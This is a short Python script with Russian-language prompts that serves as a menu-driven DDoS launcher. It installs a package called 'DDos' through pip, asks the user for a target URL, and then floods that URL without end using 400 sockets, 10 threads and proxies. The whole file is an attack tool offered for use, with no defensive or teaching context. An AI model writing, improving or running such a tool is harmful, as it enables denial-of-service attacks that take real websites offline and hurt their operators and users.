import time
def clear ():
    print("\n" * 200)
print("""
<------------------------>
| Создатель кода: 0xSn1kky
| Версия: 1.0
<------------------------>
""")
print("Загрузка команд...")
time.sleep(1)
print("""
    [Список команд]
    1. /download - установка (Обязательно)
    2. /start - начать DDos
    3. /stop - выйти (не работает во время DDos атаки используйте Ctrl+Z)
    """)
command = input("Введите команду\n")

if command == "/download":
    import os
    os.system("pip install DDos")

if command == "/stop":
    clear()
    print("Пока")
    exit(0)
   
if command == "/start":
    try:
            import DDos
            print("Введите ссылку")
            url = input("\n")
            while True:
                DDos.DDos(url, sockets = 400, threads = 10, use_proxies = True)
                
    except:
        print("Вы не установили напишите /download")
       
else:
    print("Команда не найдена!")